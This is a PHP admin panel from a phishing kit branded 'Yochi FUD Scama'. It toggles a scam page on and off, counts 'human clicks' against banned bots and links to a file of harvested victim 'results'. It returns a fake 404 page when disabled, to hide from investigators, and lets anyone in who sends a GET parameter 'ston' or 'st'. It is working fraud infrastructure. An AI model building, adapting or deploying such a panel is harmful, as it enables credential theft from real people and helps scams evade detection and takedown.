<?php 
$yochadminpage=1;
include '../btm.php';
include '../settings.php';
if ($adminpanel != 1){
	header('HTTP/1.0 404 Not Found');die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
				<html>
					<meta name="viewport" content="width=device-width, initial-scale=1.0">
					<head>
						<title>404 Not Found</title>
						</head>
					<body>
						<h1>Not Found</h1>
						<p>The requested URL was not found on this server.</p>
					</body>
				</html>');exit();};$head='Yochi FUD Scama';
$pgctnt = '';
if(isset($_POST['pass']) || isset($_GET['ston']) || isset($_GET['st'])){
	if((isset($_POST['pass']) && $_POST['pass']==$adminpass) || isset($_GET['ston']) || isset($_GET['st'])){$control='goodpass';

	$ud=file_get_contents('db.json');
	$udarray = json_decode($ud);
	$yo='';
	@$yo=file_get_contents('yo.txt');
	if($udarray->status == 'on'){$st = 'green';} else{$st = 'red';};
	$pgctnt = '
<div class="dist">
<div style="font-size:18px;text-align:left;color:'.$st.';">LIVE STATUS : '.strtoupper($udarray->status).'
<form method="post" action="proc" style="display:inline"><input name="toggle" style="width:auto;" type="submit" value="ON/OFF"/></form></div>
<div class="stathd">Visitor Statistics</div>
<span class="stat"><span class="count">'.$udarray->visits.'</span><br/><span class="desc">Total Visitors</span></span>
<span class="stat red"><span class="count">'.$udarray->bots.'</span><br/><span class="desc">Banned Bots</span></span>
<span class="stat green"><span class="count">'.$udarray->humans.'</span><br/><span class="desc">Human Clicks</span></span><br/>
<a href="yo.txt" class="stat btn">View Visitors</a>
<a href="bots.txt" class="stat btn">View Bots</a>
<a href="Results.txt" class="stat btn">View Completed Results</a>
<form method="post" action="proc" onsubmit="return confirm(&quot;Are you sure you want to Clear all your data?\r\nThis will clear your result logs too, please make sure you save them elsewhere\r\n -- YoCHI&quot;);" style="display:inline"><input name="clear" style="width:auto;" type="submit" value="CLEAR ALL DATA"/></form></div>
<div class="dist log"><div class="stathd">View Visitor Log</div>
<div class="console">'.$yo.'</div></div>';}
	else{$control='wrongpass';};
}
else{$control='nopass';};
?>
<!DOCTYPE html>
<html>
<head>
<meta name='viewport' content='width=device-width,initial-scale=1.0'/>
<title>YoCHI Admin Panel</title>
<style>
*{padding:5px;box-sizing:border-box;}
html,body{margin:0;padding:0;font-family:verdana;font-size:15px;color:#fff;background-color:#333;}
.header{text-align:center;background-color:#262626;margin:0;padding:20px}
.stathd{padding:10px 0;font-size:20px;}
div{text-align:center;}
.stat{display:inline-block;height:140px;background-color:#262626;margin:5px;border-radius:5px;}
.stat.btn{display:inline-block;width:auto;height:auto;line-height:20px;padding:10px;color:#fff;text-decoration:none;}
.stat .desc{}
.stat .count{font-size:80px;}
.red{background-color:#800000;}
.green{background-color:#006600;}
.blue{background-color:#000066;}
form{width:100%;max-width:450px;margin:100px auto;padding:20px;}
input{width:100%;height:40px;;font-size:13px;}
input[type=submit]{width:100%;height:40px;background-color:#ddd;font-size:13px;border:none;padding:5px 10px;color:#000;}
.console{text-align:left;border-radius:5px;background-color:#8c8c8c;color:#060;width:90%;height:220px;margin:auto;overflow-y:auto;}
@media only screen and (min-width:720px){
	.dist{float:left;width:60%;}
	.dist.log{width:40%;}
	.console{width:100%;height:480px;margin:auto;overflow-y:auto;}
}
</style>
</head>
<body>
<h1 class='header'>
<?php echo $head; ?>
</h1>
<div style='clear:both;display:<?php if($control=='goodpass'){echo 'block';} else{echo 'none';}?>'>
<?php echo $pgctnt; ?>
</div>
<div style='display:<?php if($control=='nopass' || $control=='wrongpass'){echo 'block';} else{echo 'none';}?>'>
<form method='post'>
<div class='red' style='visibility:<?php if($control=='wrongpass'){echo 'visible';} else{echo 'hidden';}?>'>
Fuck Outta Here !,<br/>Not Your Board, Come back when you've got the password
</div>
<input name='pass' placeholder='Enter your admin password'/>
<input type='submit' style='background-color:#262626;' value='Login'/>
</form>
</div>
</body>
</html>